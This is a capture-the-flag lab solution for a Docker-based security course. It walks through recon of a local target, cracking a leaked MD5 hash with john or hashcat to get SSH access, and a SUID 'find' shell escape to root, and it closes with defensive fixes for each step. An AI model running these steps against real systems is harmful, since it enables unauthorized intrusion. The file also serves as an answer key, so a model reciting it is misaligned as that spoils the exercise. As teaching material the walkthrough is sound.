# Day 6 SOLUTION — Full Staged Walkthrough

**Read this only after attempting Section 2's hints ladder in
[`content/day06-ctf-fundamentals.md`](../../content/day06-ctf-fundamentals.md).** This
file reproduces all three flags end to end with exact commands and expected output.

## Setup (once)

```sh
cd cyber_security/labs/base && ./up.sh
cd ../day06 && docker compose up -d --build
cd ../base && docker compose exec attacker bash
```

Everything below runs inside that attacker shell, targeting `box` by service name.

## Stage 1 — Recon & enumeration → `flag1`

```sh
nmap -sV box
```

Expected (abridged):
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH ...
80/tcp open  http    nginx ...
```

Two open services, one worth reading closely — the web server. Check what it names for
itself before assuming the visible page is everything:

```sh
curl -s http://box/robots.txt
```

Expected:
```
User-agent: *
Disallow: /backup/
```

`robots.txt` just told you about a path nothing on the page links to. Request it:

```sh
curl -s http://box/backup/
```

Expected: an nginx autoindex listing showing `creds.txt` and `flag1.txt`.

```sh
curl -s http://box/backup/flag1.txt
```

**`flag1` = `CTF{recon_finds_the_backup_dir}`**

## Stage 2 — Crack the discovered hash → `flag2`

```sh
curl -s http://box/backup/creds.txt
```

Expected: `intern:ec2c4fb3751e98ce1e5f0ab59d82af6d`

32 hex characters → MD5. Save it and crack it against the wordlist this lab already
staged for you (via `loot-loader`, into `labs/base/loot/day06/` on the host, mounted at
`/loot/day06/` in the attacker container):

```sh
mkdir -p /loot/day06
echo 'intern:ec2c4fb3751e98ce1e5f0ab59d82af6d' > /loot/day06/creds.txt
john --format=raw-md5 --wordlist=/loot/day06/wordlist.txt /loot/day06/creds.txt
john --show --format=raw-md5 /loot/day06/creds.txt
```

Expected `--show` output: `intern:sk8board99` (plus a `1 password hash cracked...`
summary line). If you prefer hashcat instead of john:

```sh
echo 'ec2c4fb3751e98ce1e5f0ab59d82af6d' > /loot/day06/hash-only.txt
hashcat -m 0 -a 0 /loot/day06/hash-only.txt /loot/day06/wordlist.txt --potfile-disable
```

Expected: a line showing `ec2c4fb3751e98ce1e5f0ab59d82af6d:sk8board99`.

A username + password is a login. Install an SSH client for this session — the
attacker toolbox doesn't ship one by default (same reasoning as Day 2's on-demand
`dsniff` install: adding it permanently to `labs/base`'s image would affect every other
day's lab):

```sh
apt-get update -qq && apt-get install -y --no-install-recommends openssh-client
ssh intern@box
# password: sk8board99
```

Once logged in as `intern`:

```sh
cat flag2.txt
```

**`flag2` = `CTF{cracked_the_weak_password_hash}`**

(Stay in this SSH session for Stage 3 — it's the `intern` shell that stage escalates
from.)

## Stage 3 — Privilege escalation to root → `flag3`

Still as `intern` (over SSH):

```sh
sudo -l
```

Expected: something to the effect of `Sorry, user intern may not run sudo on box.` —
correctly ruled out, not a dead end worth spending more time on.

```sh
find / -perm -4000 -type f 2>/dev/null
```

Expected (abridged): standard SUID binaries (`/usr/bin/passwd`, `/usr/bin/su`, ...)
**plus `/usr/bin/find` itself** — not normally SUID, the planted vector. GTFOBins'
`find` entry gives the standard SUID escape:

```sh
find . -exec /bin/sh -p \; -quit
```

Expected: a new shell prompt. Confirm the escalation actually worked:

```sh
id
```

Expected: `uid=1000(intern) gid=1000(intern) euid=0(root) ...` — the shell kept root's
*effective* UID because of `-p` (without `-p`, the shell would drop its effective UID
to match the caller's real UID, and this would silently fail to escalate).

```sh
cat /root/flag3.txt
```

**`flag3` = `CTF{suid_find_to_root}`**

## All three flags, together

| Flag | Value | Stage |
|---|---|---|
| flag1 | `CTF{recon_finds_the_backup_dir}` | recon/enum |
| flag2 | `CTF{cracked_the_weak_password_hash}` | hash cracking |
| flag3 | `CTF{suid_find_to_root}` | privilege escalation |

## Defense reflection, per flag

- **flag1:** `/backup/` shouldn't be under the web root at all, or should sit behind
  real authentication — `robots.txt` naming it is a convention crawlers can choose to
  honor, not an access control; it's also itself a small information leak.
- **flag2:** the real fix is enforcing password strength at account creation, not just
  hashing strength after the fact — a slow salted KDF (bcrypt/argon2) raises the cost
  per guess, but a short wordlist-guessable password eventually loses to offline
  cracking regardless of hash algorithm.
- **flag3:** least privilege — `find` never legitimately needs the SUID bit
  (`chmod u-s /usr/bin/find` removes the vector entirely); `auditd` watching for
  privileged process spawns from unexpected binaries would additionally have logged
  this escalation as it happened.

## Teardown

```sh
cd cyber_security/labs/day06
docker compose down -v
```
